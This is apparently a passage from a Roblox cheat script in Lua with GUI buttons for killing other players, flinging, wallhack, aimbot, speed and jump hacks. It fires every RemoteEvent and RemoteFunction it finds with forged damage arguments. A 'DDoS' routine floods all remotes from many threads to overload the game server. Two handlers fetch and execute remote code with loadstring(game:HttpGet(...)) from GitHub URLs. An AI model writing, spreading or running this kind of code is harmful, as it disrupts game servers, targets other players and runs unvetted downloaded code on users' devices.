local allRemotes = {}

local function findAllRemotes()
    allRemotes = {}
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(allRemotes, obj)
        end
    end
    return allRemotes
end

local function tryKillWithRemote(targetPlayer, remote)
    if not remote or not remote.Parent then return false end
    
    local args = {
        [1] = targetPlayer,
        [2] = targetPlayer.Character.Humanoid,
        [3] = 9999,
        [4] = player.Character.HumanoidRootPart.Position,
        [5] = targetPlayer.Character.HumanoidRootPart.Position,
        [6] = "damage",
        [7] = workspace,
        [8] = Vector3.new(0,0,0),
        [9] = 100,
        [10] = true
    }
    
    local success = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(unpack(args))
        else
            remote:InvokeServer(unpack(args))
        end
    end)
    
    return success
end

local function killPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then
        updateStatus("Target not found", true)
        return
    end
    
    local remotes = findAllRemotes()
    updateStatus("Testing " .. #remotes .. " remotes...")
    
    local killed = false
    
    for i, remote in ipairs(remotes) do
        if remote and remote.Parent then
            local success = tryKillWithRemote(targetPlayer, remote)
            if success then
                killed = true
                updateStatus(targetPlayer.Name .. " killed with: " .. remote.Name)
                break
            end
        end
        if i % 10 == 0 then
            task.wait(0.05)
        end
    end
    
    if not killed then
        local character = targetPlayer.Character
        local humanoid = character:FindFirstChild("Humanoid")
        
        if humanoid then
            local success = pcall(function()
                humanoid:Destroy()
            end)
            
            if success then
                updateStatus(targetPlayer.Name .. " killed (client)")
            else
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    rootPart.CFrame = CFrame.new(0, -500, 0)
                    updateStatus(targetPlayer.Name .. " teleported to void")
                end
            end
        end
    end
end

local function startDDoS()
    if ddosActive then
        ddosActive = false
        for _, thread in pairs(ddosThreads) do
            if thread then
                task.cancel(thread)
            end
        end
        ddosThreads = {}
        DDoSButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        updateStatus("DDoS stopped")
        return
    end
    
    ddosActive = true
    DDoSButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    updateStatus("DDoS started")
    
    local remotes = findAllRemotes()
    updateStatus(#remotes .. " remotes found, attacking...")
    
    local function attackRemote(remote)
        while ddosActive and remote and remote.Parent do
            local success = pcall(function()
                for i = 1, 50 do
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, i, math.random(), tick())
                    else
                        remote:InvokeServer({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, i, math.random(), tick())
                    end
                end
            end)
            if not success then
                break
            end
            task.wait(0.01)
        end
    end
    
    for i, remote in pairs(remotes) do
        local thread = task.spawn(function()
            attackRemote(remote)
        end)
        table.insert(ddosThreads, thread)
    end
    
    task.spawn(function()
        while ddosActive do
            local newRemotes = findAllRemotes()
            for i, remote in ipairs(newRemotes) do
                local alreadyRunning = false
                for _, thread in pairs(ddosThreads) do
                end
                if not alreadyRunning then
                    local thread = task.spawn(function()
                        attackRemote(remote)
                    end)
                    table.insert(ddosThreads, thread)
                end
            end
            task.wait(1)
        end
    end)
end

SpeedButton.MouseButton1Click:Connect(function()
    speedEnabled = not speedEnabled
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            if speedEnabled then
                originalSpeed = humanoid.WalkSpeed
                humanoid.WalkSpeed = currentSpeed
                SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                updateStatus("Speed Active (120)")
            else
                humanoid.WalkSpeed = 16
                SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                updateStatus("Speed Disabled")
            end
        end
    end
end)

JumpButton.MouseButton1Click:Connect(function()
    jumpEnabled = not jumpEnabled
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            if jumpEnabled then
                originalJump = humanoid.JumpPower
                humanoid.JumpPower = currentJump
                JumpButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                updateStatus("Jump Active (250)")
            else
                humanoid.JumpPower = 50
                JumpButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                updateStatus("Jump Disabled")
            end
        end
    end
end)

if isMobile then
    SpeedButton.TouchTap:Connect(function()
        speedEnabled = not speedEnabled
        local character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                if speedEnabled then
                    originalSpeed = humanoid.WalkSpeed
                    humanoid.WalkSpeed = currentSpeed
                    SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                    updateStatus("Speed Active (120)")
                else
                    humanoid.WalkSpeed = 16
                    SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    updateStatus("Speed Disabled")
                end
            end
        end
    end)
    
    JumpButton.TouchTap:Connect(function()
        jumpEnabled = not jumpEnabled
        local character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                if jumpEnabled then
                    originalJump = humanoid.JumpPower
                    humanoid.JumpPower = currentJump
                    JumpButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                    updateStatus("Jump Active (250)")
                else
                    humanoid.JumpPower = 50
                    JumpButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    updateStatus("Jump Disabled")
                end
            end
        end
    end)
    
    KillButton.TouchTap:Connect(function()
        showPlayerList(function(selected)
            killPlayer(selected)
        end)
    end)
    
    FlingButton.TouchTap:Connect(function()
        updateStatus("Loading Fling...")
        local success = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/K1LAS1K/Ultimate-Fling-GUI/main/flingscript.lua"))()
        end)
        if success then
            updateStatus("Fling loaded")
        else
            updateStatus("Fling failed to load", true)
        end
    end)
    
    WallhackButton.TouchTap:Connect(function()
        wallhackEnabled = not wallhackEnabled
        toggleWallhack(wallhackEnabled)
        WallhackButton.BackgroundColor3 = wallhackEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
    end)
    
    AimbotButton.TouchTap:Connect(function()
        aimbotEnabled = not aimbotEnabled
        toggleAimbot(aimbotEnabled)
        AimbotButton.BackgroundColor3 = aimbotEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
    end)
    
    AC6Button.TouchTap:Connect(function()
        updateStatus("Loading AC6 Sound...")
        local success = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/AC6-Music-Exploit/refs/heads/main/Ac6ExploitSource.luau"))()
        end)
        if success then
            updateStatus("AC6 Sound loaded")
        else
            updateStatus("AC6 Sound failed to load", true)
        end
    end)
    
    DDoSButton.TouchTap:Connect(function()
        startDDoS()
    end)
end

